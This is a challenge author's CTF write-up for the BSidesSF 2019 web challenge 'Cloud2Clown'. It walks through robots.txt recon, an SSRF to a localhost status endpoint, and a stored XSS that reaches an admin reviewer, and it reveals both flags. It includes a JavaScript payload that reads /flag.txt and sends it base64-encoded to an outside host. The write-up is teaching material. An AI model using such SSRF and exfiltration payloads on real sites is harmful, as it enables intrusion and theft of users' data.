---
layout: post
title: "BSides SF CTF Author Writeup: Cloud2Clown"
category: Security
date: 2019-03-07
tags:
  - CTF
  - BSidesSF
---
## The Challenge ##

> Sometimes you see marketing materials that use the word cloud to the point
> that it starts to lose all meaning. This service allows you to fix that with
> clowns instead of clouds. Note: there are 2 flags, they should be clearly
> labeled.

This was a web challenge with 2 flags hidden inside.  When you visited the
challenge, you saw a very basic web form that prompted only for a URL.

![Cloud2Clown](/img/blog/bsidessf2019/cloud2clown.png)

Giving it a quick try, we see that it requests the page at the URL you provide,
then re-renders it with the word "Cloud" replaced with the word "Clown".
Notably, this is served on `/render`, but on the same
[domain, port, and protocol](https://en.wikipedia.org/wiki/Same-origin_policy)
as the rest of the site.

## Recon ##

So how can we find out more about the challenge?  Well, short of blowing up the
server with dirbuster, there are some URLs that can be useful to check on web
applications.  A couple of examples include:

* `/sitemap.xml`
* `/robots.txt`

There's no sitemap for this site, but there is a `robots.txt` file with the
following contents:

```
User-agent: *
Disallow: /flag.txt
Disallow: /status
Disallow: /flag
Disallow: /hack
```

If we visit each of these URLs in turn, we will find that `/flag.txt` returns
"Forbidden" and `/status` returns "Not in IP whitelist."  `/hack` was a red
herring that lead to my blog, and `/flag` just returns "Invalid URL."

## Vulnerability 1: SSRF ##

(This was actually labeled as flag 2, as it was added as an afterthought.)

Since this is a server that issues outbound HTTP/HTTPS requests, [Server Side
Request Forgery](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
(SSRF) is an obvious candidate.  Since this is well-known to bypass firewalls or
IP whitelists, it looks like this is a good option to go after whatever
information is in `/status`.  Unfortunately, a request to render
`https://cloud2clown-dc9b5aed.challenges.bsidessf.net/status` does not work,
still giving access denied.  This does not work because all of the web services
are behind a [Google Cloud Load Balancer](https://cloud.google.com/load-balancing/),
so the request still appears to come from the outside.  Trying
`http://localhost/status` also fails, this time because it's not running on
port 80.  Since you often won't know the port for a backend service, it may be
necessary to try it.  You can either try brute force or go for the top web
service ports.  In either case, if you try `http://localhost:8081/status`,
you'll find that you get a JSON structure instead of an error:

```
{
  "author": "Matir",
  "flag2": "CTF{ssrf_for_more_than_metadata}",
  "ipWhitelist": [
    "127.0.0.1",
    "127.1.1.1",
    "13.37.13.37",
    "::1"
  ],
  "remoteAddr": "[::1]:56190",
  "reviewQueue": 0,
  "reviewQueueSize": 1024
}
```

One of the elements is clearly the flag we're after:
`CTF{ssrf_for_more_than_metadata}`.

## Vulnerability 2: XSS ##

Since the service blindly renders any page you give it, this will include
rendering JavaScript.  At first, this appears to only be a self-XSS since it
just reflects the rendering back to the player.  However, at the bottom of each
rendered page, there is a bar added that says "Page rendered by Cloud2Clown" and
has a link to "Report Page Error".  Clicking on the button pushed the URL into a
queue to be visited by the admin.  When the admin visited it, any javascript
payload would be executed for the admin, including the ability to request the
`/flag.txt` path.  My canonical test payload was:

```
<script>
fetch('/flag.txt', {mode: 'no-cors'}).then(function(r) {
  r.text().then(function(f) {
    var img = document.createElement('img');
    img.src = 'http://ctf.1337.fyi:3333/' + btoa(f);
  })
})
</script>
```

This sent a request to `http://ctf.1337.fyi:3333` with the flag encoded as
base64.  A quick decode later revealed `Flag 1: CTF{we_hope_that_wasnt_hard}`.

## Conclusion ##

For some reason, players seemed to struggle with this challenge, but all the
admins thought it straightforward.  Have feedback?
Hit me up on [Twitter](https://twitter.com/Matir) or the BSidesSF slack
(@Matir).
